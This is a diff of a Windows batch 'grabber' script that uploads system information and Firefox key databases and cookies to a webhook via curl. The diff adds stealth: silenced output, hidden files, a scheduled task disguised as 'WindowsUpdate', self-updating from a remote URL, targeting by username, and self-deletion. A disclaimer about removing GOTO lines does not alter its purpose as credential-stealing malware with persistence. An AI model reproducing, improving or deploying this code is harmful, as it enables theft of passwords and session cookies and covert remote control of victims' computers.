@@ -1,5 +1,6 @@
 @echo off
-:: BY REMOVING THE (GOTO)s YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
+:: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
+:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.
 
 goto remove_this_if_you_agree_to_follow_the_TOS
 
@@ -29,7 +30,7 @@ goto skipsysteminfocapture
 	set tempsys=%appdata%\sysinfo.txt
 	2>NUL SystemInfo > %tempsys%
 	curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
-	del %tempsys%
+	2>NUL del %tempsys%
 :skipsysteminfocapture
 
 :: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
@@ -74,7 +75,6 @@ for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
 		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
-		pause
 	)
 )
 :skipfirefox
@@ -141,14 +141,14 @@ goto skipgrowtopia
 :: DO NOT EDIT
 set "recurring=false"
 
-:: RECURRING - REMOVE THE GOTO IF YOU WANT IT | MAKES TASK SCHEDULER OPEN THE FILE | UPDATER CAN BE ENABLED TO UPDATE THE BATCH
+:: RECURRING - REMOVE THE GOTO IF YOU WANT IT | MAKES TASK SCHEDULER OPEN THE FILE | UPDATER CAN BE ENABLED TO UPDATE THE BATCH | CAN TARGET USERS
 :: ----------------------------------------------------------------------------------------------------------------------------
 goto skiprecurring
 
 :: Change attributes to make editing files possible
-attrib -h %vpath%\%bname%
-attrib -h %vpath%\%uname%
-attrib -h %vpath%\%vname%
+>NUL attrib -h %vpath%\%bname%
+>NUL attrib -h %vpath%\%uname%
+>NUL attrib -h %vpath%\%vname%
 
 :: MINUTE (1 - 1439 minutes), HOURLY (1 - 23 hours), DAILY (1 - 365 days), WEEKLY (1 - 52 weeks), MONTHLY (1 - 12 months/ lastday), ONCE, ONSTART (REQUIRE ADMINISTRATOR), ONLOGON (REQUIRE ADMINISTRATOR
 set "when=Daily"
@@ -156,34 +156,104 @@ set "when=Daily"
 set "ScheduleName=WindowsUpdate"
 :: Name of this batch file's copy to the selected path. Default = 0.bat
 set "bname=0.bat"
-:: Name of the updater. Default = 1.bat
+:: Name of the updater batch. Default = 1.bat
 set "uname=1.bat"
 :: Name of the VBS file that will be hidden and executed by task scheduler, the file opens the batch hiddenly. Default = 0.vbs
 set "vname=0.vbs"
-:: If you change the URL, then when Task Scheduler runs the file it will download the file from there and replace it with the current batch file. Needs to be raw link.
-set "updateurl="
+
+:: Task Scheduler runs a downloader, it will download the text from your URL and replace it with the current batch file. Needs to be raw link. Leave blank to skip.
+set "updateurl=www.google.com"
+	:: Target computer's username (Case sensitive) | Leave blank to skip.
+	set "targetusername="
+	
 :: Path to the hide location
 set "vpath=%appdata%\Microsoft\Windows"
-:: Copy batch file to a folder
 
-del /ah "%vpath%\%uname%"
-del /ah "%vpath%\%vname%"
+2>NUL del /ah "%vpath%\%uname%"
+2>NUL del /ah "%vpath%\%vname%"
 
+:: Copy the batch to the hidden location
 if not "%cd%"=="%vpath%" (
-copy "%~f0" "%vpath%\%bname%"
+ 2>NUL del /ah "%vpath%\%bname%"
+ >NUL copy "%~f0" "%vpath%\%bname%"
 )
 
 if "%updateurl%"=="" (
-	:: RUN RECURRING WITHOUT UPDATING
+	
+	:normalrecurring
 	echo set WshShell = wscript.createobject^("WScript.shell"^)>> %vpath%\%vname%
 	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> %vpath%\%vname%
 	echo set WshShell = Nothing>> %vpath%\%vname%
-	
+
 	:: DO NOT REMOVE
 	goto skipupdateconfig
-) else (
-	:: RUN RECURRING WITH UPDATING
-	IF EXIST "%vpath%\temp.txt" del %vpath%\temp.txt
+	
+) else ( goto recurringupdate )
+
+goto dontremoveme
+:recurringupdate
+
+:: IF TARGET USERNAME IS SET
+if "%targetusername%"=="" (
+	
+	goto nontargetedupdate 
+	
+) else ( goto targetedupdate )
+
+goto dontremoveme2
+:nontargetedupdate
+:: TARGET USERNAME IS NOT SET, UPDATING ON EVERY COMPUTER
+
+IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
+
+:: Change VBS
+echo set WshShell = wscript^.createobject^("WScript.shell"^)>> %vpath%\%vname%
+echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> %vpath%\%vname%
+echo set WshShell = Nothing>> %vpath%\%vname%
+
+:: Make updater batch
+echo ^@echo off> %vpath%\%uname%
+echo cd %vpath%>> %vpath%\%uname%
+echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
+echo ^>NUL attrib -h %bname%>> %vpath%\%uname%
+echo ^>NUL attrib -h %uname%>> %vpath%\%uname%
+echo ^>NUL attrib -h %vname%>> %vpath%\%uname%
+echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> %vpath%\temp.txt>> %vpath%\%uname%
+echo :wl>> %vpath%\%uname%
+echo IF EXIST "%vpath%\temp.txt" GOTO w2>> %vpath%\%uname%
+echo timeout /t 1 >> %vpath%\%uname%
+echo goto wl>> %vpath%\%uname%
+echo :w2>> %vpath%\%uname%
+echo 2^>NUL del %bname%>> %vpath%\%uname%
+echo ren temp.txt %bname%>> %vpath%\%uname%
+echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
+echo break^>%vname%>> %vpath%\%uname%
+echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo start %vname%>> %vpath%\%uname%
+echo timeout 1 ^>nul>> %vpath%\%uname%
+echo break^>%vname%>> %vpath%\%uname%
+echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
+echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
+echo ^>NUL attrib %vpath%\%bname% +h>> %vpath%\%uname%
+echo ^>NUL attrib %vpath%\%uname% +h>> %vpath%\%uname%
+echo call ^:d ^& exit /b>> %vpath%\%uname%
+echo :d>> %vpath%\%uname%
+echo start ^/b "" cmd ^/c 2^>NUL del %vpath%\%uname%^&exit /b>> %vpath%\%uname%
+
+goto skipupdateconfig
+:dontremoveme2
+
+goto dontremoveme3
+:targetedupdate
+:: TARGET USERNAME IS SET, UPDATING ON TARGET PC
+
+IF "%USERNAME%"=="%targetusername%" (
+
+	IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
 
 	:: Change VBS
 	echo set WshShell = wscript^.createobject^("WScript.shell"^)>> %vpath%\%vname%
@@ -193,36 +263,41 @@ if "%updateurl%"=="" (
 	:: Make updater batch
 	echo ^@echo off> %vpath%\%uname%
 	echo cd %vpath%>> %vpath%\%uname%
-	echo IF EXIST "%vpath%\temp.txt" del %vpath%\temp.txt>> %vpath%\%uname%
-	echo attrib -h %bname%>> %vpath%\%uname%
-	echo attrib -h %uname%>> %vpath%\%uname%
-	echo attrib -h %vname%>> %vpath%\%uname%
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
+	echo ^>NUL attrib -h %bname%>> %vpath%\%uname%
+	echo ^>NUL attrib -h %uname%>> %vpath%\%uname%
+	echo ^>NUL attrib -h %vname%>> %vpath%\%uname%
 	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> %vpath%\temp.txt>> %vpath%\%uname%
 	echo :wl>> %vpath%\%uname%
 	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> %vpath%\%uname%
 	echo timeout /t 1 >> %vpath%\%uname%
 	echo goto wl>> %vpath%\%uname%
 	echo :w2>> %vpath%\%uname%
-	echo del %bname%>> %vpath%\%uname%
+	echo 2^>NUL del %bname%>> %vpath%\%uname%
 	echo ren temp.txt %bname%>> %vpath%\%uname%
-	echo IF EXIST "%vpath%\temp.txt" del %vpath%\temp.txt>> %vpath%\%uname%
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
 	echo break^>%vname%>> %vpath%\%uname%
 	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo start %vname%>> %vpath%\%uname%
-	echo timeout 1 >nul>> %vpath%\%uname%
+	echo timeout 1 ^>nul>> %vpath%\%uname%
 	echo break^>%vname%>> %vpath%\%uname%
 	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
 	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
-	echo attrib %vpath%\%vname% +h>> %vpath%\%uname%
-	echo attrib %vpath%\%bname% +h>> %vpath%\%uname%
-	echo attrib %vpath%\%uname% +h>> %vpath%\%uname%
+	echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
+	echo ^>NUL attrib %vpath%\%bname% +h>> %vpath%\%uname%
+	echo ^>NUL attrib %vpath%\%uname% +h>> %vpath%\%uname%
 	echo call ^:d ^& exit /b>> %vpath%\%uname%
 	echo :d>> %vpath%\%uname%
-	echo start ^/b "" cmd ^/c del %vpath%\%uname%^&exit /b>> %vpath%\%uname%
-)
+	echo start ^/b "" cmd ^/c 2^>NUL del %vpath%\%uname%^&exit /b>> %vpath%\%uname%
+	
+	goto skipupdateconfig
+) else ( goto normalrecurring )
+:dontremoveme3
+
+:dontremoveme
 :skipupdateconfig
 
 :: If using onlogin use this - Might give away your file though
@@ -233,7 +308,7 @@ if not "%cd%"=="%vpath%" (
 :skipadministrator
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
-SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
+>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
 IF NOT ERRORLEVEL 1 (
 	:: DO NOT EDIT, INFO FOR WEBHOOK
 	set "recurring=true, %when%"
@@ -243,9 +318,9 @@ IF NOT ERRORLEVEL 1 (
 )
 
 :: Hide batch & VBS
-attrib %vpath%\%vname% +h
-attrib %vpath%\%bname% +h
-attrib %vpath%\%uname% +h
+>NUL attrib %vpath%\%vname% +h
+>NUL attrib %vpath%\%bname% +h
+>NUL attrib %vpath%\%uname% +h
 
 :: END OF RECURRING METHOD
 :: -----------------------
@@ -261,7 +336,7 @@ goto skipselfdelete
 if not "%cd%"=="%vpath%" (
 	call :d & exit /b
 	:d
-	start /b "" cmd /c del "%~f0"&exit /b
+	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
 )
 :skipselfdelete
 
